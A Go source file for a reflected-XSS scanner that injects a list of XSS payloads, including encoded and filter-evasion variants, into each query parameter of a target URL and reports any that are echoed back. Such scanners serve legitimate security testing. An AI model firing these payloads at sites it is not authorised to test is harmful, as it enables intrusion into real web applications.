package main

import (
	"bufio"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
)

// Advanced XSS payloads for testing
var xssPayloads = []string{
	// Basic payloads
	"<script>alert('XSS')</script>",
	"<img src=x onerror=alert('XSS')>",
	"'><script>alert('XSS')</script>",
	"\"<script>alert('XSS')</script>",
	"javascript:alert('XSS')",

	// Bypass filters
	"<svg/onload=alert('XSS')>",
	"<img src=x oneonerrorrror=alert('XSS')>",
	"<iframe src=\"javascript:alert('XSS')\"></iframe>",
	"<body onload=alert('XSS')>",
	"<a href=\"javascript:alert('XSS')\">Click Me</a>",

	// Encoded payloads
	"&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;",
	"<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;>",

	// DOM-based XSS
	"\" onmouseover=\"alert('XSS')",
	"\" onfocus=\"alert('XSS')",
	"\" onblur=\"alert('XSS')",

	// Advanced evasion techniques
	"<script>alert(String.fromCharCode(88,83,83))</script>",
	"<img src=x onerror=eval('alert(\"XSS\")')>",
	"<img src=x onerror=Function('alert(\"XSS\")')()>",
	"<img src=x onerror=setTimeout('alert(\"XSS\")', 0)>",

	// Bypassing common sanitizers
	"<img src=x oneonerrorrror=alert`XSS`>",
	"<img src=x oneonerrorrror=alert&lpar;'XSS'&rpar;>",
	"<img src=x oneonerrorrror=alert&#40;'XSS'&#41;>",
}

// Function to test for XSS vulnerability
func testXSS(targetURL string, param string, payload string) bool {
	// Create a new URL with the payload
	u, err := url.Parse(targetURL)
	if err != nil {
		fmt.Printf("Error parsing URL: %s\n", err)
		return false
	}

	// Add the payload to the query parameters
	q := u.Query()
	q.Set(param, payload)
	u.RawQuery = q.Encode()

	// Send a GET request to the target URL
	resp, err := http.Get(u.String())
	if err != nil {
		fmt.Printf("Error sending request: %s\n", err)
		return false
	}
	defer resp.Body.Close()

	// Check if the payload is reflected in the response
	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		if strings.Contains(scanner.Text(), payload) {
			return true
		}
	}

	return false
}

func main() {
	// Check if the user provided a target URL
	if len(os.Args) < 2 {
		fmt.Println("Usage: go run xss_scanner.go <target_url>")
		return
	}

	targetURL := os.Args[1]

	// Extract query parameters from the target URL
	u, err := url.Parse(targetURL)
	if err != nil {
		fmt.Printf("Error parsing URL: %s\n", err)
		return
	}

	params := u.Query()

	// Test each parameter for XSS vulnerability
	for param := range params {
		for _, payload := range xssPayloads {
			if testXSS(targetURL, param, payload) {
				fmt.Printf("[+] XSS Vulnerability found in parameter: %s with payload: %s\n", param, payload)
			}
		}
	}
}
